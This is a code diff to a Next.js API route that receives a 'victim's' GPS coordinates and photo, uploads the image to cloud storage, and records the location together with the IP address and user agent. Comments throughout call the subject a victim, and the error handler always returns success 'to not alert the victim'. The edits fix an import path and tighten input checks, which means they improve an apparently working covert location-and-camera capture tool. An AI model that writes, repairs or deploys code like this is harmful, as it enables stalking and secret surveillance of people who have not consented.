@@ -1,7 +1,6 @@
-// app/api/capture/route.js
 import { NextResponse } from 'next/server';
 import { put } from '@vercel/blob';
-import { initDB, updateCapture } from '@/lib/db';
+import { initDB, updateCapture } from '../../lib/db';
 
 export async function POST(request) {
   try {
@@ -16,7 +15,7 @@ export async function POST(request) {
     let photoUrl = null;
 
     // Upload photo to Vercel Blob if provided
-    if (photoFile && photoFile instanceof Blob) {
+    if (photoFile && photoFile instanceof Blob && photoFile.size > 0) {
       const buffer = Buffer.from(await photoFile.arrayBuffer());
       const filename = `captures/${Date.now()}_${Math.random().toString(36).substring(2, 8)}.jpg`;
       const blob = await put(filename, buffer, {
@@ -30,7 +29,7 @@ export async function POST(request) {
     // If we have a victimId, update that record
     if (victimId && lat && lng) {
       await updateCapture(victimId, lat, lng, accuracy, photoUrl);
-    } else {
+    } else if (lat && lng) {
       // Otherwise insert a new record (GPS + photo only)
       const ip = request.headers.get('x-forwarded-for') || 'unknown';
       const ua = request.headers.get('user-agent') || 'unknown';
@@ -45,6 +44,7 @@ export async function POST(request) {
     return NextResponse.json({ status: 'ok' });
   } catch (error) {
     console.error('[CAPTURE ERROR]', error);
-    return NextResponse.json({ status: 'ok' }); // Always return ok to not alert the victim
+    // Always return ok to not alert the victim
+    return NextResponse.json({ status: 'ok' });
   }
 }
